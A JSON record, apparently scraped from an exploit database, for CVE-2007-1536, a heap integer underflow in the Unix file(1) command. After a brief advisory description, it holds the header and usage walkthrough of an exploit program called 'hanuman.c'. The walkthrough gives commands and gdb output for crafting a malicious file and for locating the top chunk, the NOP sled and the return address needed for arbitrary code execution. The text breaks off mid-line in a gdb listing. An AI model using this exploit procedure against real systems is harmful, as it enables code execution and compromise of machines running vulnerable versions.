{
    "text": "ecve : CVE-2007-1536 ， title : File ( 1 ) 4.13 - Command File_PrintF Integer Underflow - Linux remote Exploit ， verified : Verified ， exploit_detail : // source :  ， The file ( 1 ) command is prone to an integer-underflow vulnerability because the command fails to adequately handle user-supplied data. ， An attacker can leverage this issue to corrupt heap memory and execute arbitrary code with the privileges of a user running the command. A successful attack may result in the compromise of affected computers. Failed attempts will likely cause denial-of-service conditions. ， Versions prior to 4.20 are vulnerable. ， / *  ，  * hanuman.c ，  * file ( 1 ) exploit for version 4.16 to 4.19. ，  * Coded by Jean-Sebastien Guay-Leroux ，  * / ， / *  ， Here are the steps to find the 3 memory values to use for the ， file ( 1 )  ， exploit. ， 1- The first step is to generate a core dump file from file ( 1 ) . ， You will ， then have to analyze this core dump to find the proper values for ， your ， exploit. ， To generate the core file , get an approximation of the top chunk ， location ， by getting the base address of the BSS section :  ， bash # readelf -S /usr/bin/file ， Section Headers :  ，  [ Nr ] Name Type Addr ，  [ 0 ] NULL 00000000 ，  [ 1 ] .interp PROGBITS 080480f4 ，  [ ... ]  ，  [ 22 ] .bss NOBITS 0804b1e0 ， The BSS section starts at 0x0804b1e0. Let's call the exploit the ， following ， way , and remember to replace 0x0804b1e0 for the BSS value you have ， found :  ， bash # ./hanuman 0xc0c0c0c0 0x0804b1e0 0x0804b1e0 mal ， -- [ Using 0x804b1e0 as the top chunk location. ， -- [ Impossible to use 0xc0c0c0c0 as the return location. Using ， 0xc0c0c0c4 ， instead ， -- [ Impossible to use 0x804b1e0 as the return address. Using ， 0x804b1e1 ， instead ， -- [ The file has been written ， bash # file mal ， Segmentation fault ( core dumped )  ， bash #  ， 2- Call gdb on that core dump file. ， bash # gdb -q file core.14854 ， Core was generated by `file mal'. ， Program terminated with signal 11 , Segmentation fault. ， Reading symbols from /usr/local/lib/libmagic.so.1...done. ， Loaded symbols for /usr/local/lib/libmagic.so.1 ， Reading symbols from /lib/i686/libc.so.6...done. ， Loaded symbols for /lib/i686/libc.so.6 ， Reading symbols from /lib/ld-linux.so.2...done. ， Loaded symbols for /lib/ld-linux.so.2 ， Reading symbols from /usr/lib/gconv/ISO8859-1.so...done. ， Loaded symbols for /usr/lib/gconv/ISO8859-1.so ，  # 0 0x400a3d15 in mallopt (  ) from /lib/i686/libc.so.6 ，  ( gdb )  ， 3- The EAX register contains the address of the top chunk. It ， might be ， another register for you. ，  ( gdb ) info reg eax ， eax 0x80614f8 134616312 ，  ( gdb )  ， 4- Start searching from the location of the top chunk to find the ， NOP ， cushion. This will be the return address. ， 0x80614f8 : 0xc0c0c0c1 0xb8bc0ee1 0xc0c0c0c1 ， 0xc0c0c0c1 ， 0x8061508 : 0xc0c0c0c1 0xc0c0c0c1 0x73282027 ， 0x616e6769 ， 0x8061518 : 0x2930206c 0x90909000 0x90909090 ， 0x90909090 ， 0x8061528 : 0x90909090 0x90909090 0x90909090 ， 0x90909090 ， 0x8061538 : 0x90909090 0x90909090 0x90909090 ， 0x90909090 ， 0x8061548 : 0x90909090 0x90909090 0x90909090 ， 0x90909090 ， 0x8061558 : 0x90909090 0x90909090 0x90909090 ， 0x90909090 ， 0x8061568 : 0x90909090 0x90909090 0x90909090 ， 0x90909090 ， 0x8061578 : 0x90909090 0x90909090 0x90909090 ， 0x90909090 ， 0x8061588 : 0x90909090 0x90909090 0x90909090 ， 0x90909090 ， 0x8061598 : 0x90909090 0x90909090 0x90909090 ， 0x90909090 ， 0x80615a8 : 0x90909090 0x90909090 0x90909090 ， 0x90909090 ， 0x80615b8 : 0x90909090 0x90909090 ，  ( gdb )  ， 0x8061558 is a valid address. ， 5- To get the return location for your exploit , get a saved EIP ， from a ， stack frame. ，  ( gdb ) frame 3 ，  # 3 0x4001f32e in file_tryelf ( ms=0x804bc90 , fd=3 , buf=0x0 ,  ， nbytes=8192 ) at ， readelf.c : 1007 ， 1007 if ( doshn ( ms , ",
    "time": "2007-03-19"
}